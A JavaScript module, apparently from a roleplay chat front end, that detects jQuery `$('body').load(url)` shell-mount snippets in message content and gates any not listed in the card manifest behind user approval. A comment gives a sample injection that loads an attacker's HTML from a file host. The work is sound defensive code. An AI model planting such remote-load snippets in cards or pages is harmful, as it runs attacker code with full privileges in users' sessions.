/**
 * Detect executable card-shell mounts inside display_content after ST display regex.
 * test-card replaces 【首页】 / <customized> / <StatusPlaceHolderImpl/> with
 * `$('body').load('https://…/home|custom_start|status/index.html')` snippets.
 */

const LOAD_RE =
  /\$\(\s*['"]body['"]\s*\)\s*\.load\(\s*['"`](https?:\/\/[^'"`]+)['"`]\s*\)/gi

/**
 * @param {string} displayContent
 * @returns {{ mounts: Array<{url:string, kind:string}>, residualText: string }}
 */
export function extractShellMountsFromDisplay(displayContent) {
  const text = String(displayContent || '')
  const mounts = []
  const seen = new Set()
  let m
  const re = new RegExp(LOAD_RE.source, LOAD_RE.flags)
  while ((m = re.exec(text)) !== null) {
    const url = m[1]
    if (seen.has(url)) continue
    seen.add(url)
    mounts.push({ url, kind: classifyShellUrl(url) })
  }

  // Strip shell glue so residual static text can still render via RichContent.
  let residual = text
  residual = residual.replace(/```[\s\S]*?\$\(\s*['"]body['"]\s*\)\s*\.load\([\s\S]*?```/gi, '')
  residual = residual.replace(
    /<body[^>]*>\s*<script[^>]*>\s*\$\(\s*['"]body['"]\s*\)\s*\.load\([\s\S]*?<\/script>\s*<\/body>/gi,
    '',
  )
  residual = residual.replace(
    /\$\(\s*['"]body['"]\s*\)\s*\.load\(\s*['"`]https?:\/\/[^'"`]+['"`]\s*\)/gi,
    '',
  )
  residual = residual.replace(/\n{3,}/g, '\n\n').trim()

  return { mounts, residualText: residual }
}

export function classifyShellUrl(url) {
  const u = String(url || '').toLowerCase()
  if (u.includes('/status/')) return 'status'
  if (u.includes('/home/')) return 'opening_home'
  if (u.includes('custom_start')) return 'opening_custom'
  return 'message_html'
}

/**
 * Split message-mounted shells into auto-mountable and confirm-gated (H3).
 *
 * Shell documents get full bridge privileges, so a `.load(url)` appearing in
 * message display_content is a code-execution decision, not a resource fetch.
 * Only URLs registered in the card's own shell manifest (extracted at import)
 * mount automatically; anything else — e.g. a card regex rewriting model
 * output to `.load('https://files.catbox.moe/<attacker>.html')` — must be
 * explicitly approved by the user for this session.
 *
 * @param {Array<{url:string, kind:string}>} mounts
 * @param {Array<string> | null | undefined} trustedUrls card-manifest URLs
 * @param {Array<string> | null | undefined} approvedUrls user-approved URLs
 * @returns {{ allowed: Array<object>, needsConfirmation: Array<object> }}
 */
export function partitionShellMountsByTrust(mounts, trustedUrls = [], approvedUrls = []) {
  const norm = (u) => String(u || '').trim()
  const toSet = (urls) =>
    new Set((Array.isArray(urls) ? urls : []).map(norm).filter(Boolean))
  const trusted = toSet(trustedUrls)
  const approved = toSet(approvedUrls)
  const allowed = []
  const needsConfirmation = []
  for (const mount of Array.isArray(mounts) ? mounts : []) {
    const url = norm(mount?.url)
    if (url && (trusted.has(url) || approved.has(url))) {
      allowed.push(mount)
    } else {
      needsConfirmation.push(mount)
    }
  }
  return { allowed, needsConfirmation }
}

/**
 * Prefer message-local shell mounts; fall back to campaign-level status URL.
 * @param {Array<{url:string, kind:string}>} mounts
 * @param {{ statusUrl?: string|null, openingUrl?: string|null }} fallback
 */
export function resolveShellSurfaces(mounts, fallback = {}) {
  const list = Array.isArray(mounts) ? mounts.slice() : []
  const hasStatus = list.some((x) => x.kind === 'status')
  const hasOpening = list.some(
    (x) => x.kind === 'opening_home' || x.kind === 'opening_custom',
  )
  if (!hasStatus && fallback.statusUrl) {
    list.unshift({ url: fallback.statusUrl, kind: 'status' })
  }
  if (!hasOpening && fallback.openingUrl) {
    list.push({
      url: fallback.openingUrl,
      kind: classifyShellUrl(fallback.openingUrl),
    })
  }
  return list
}
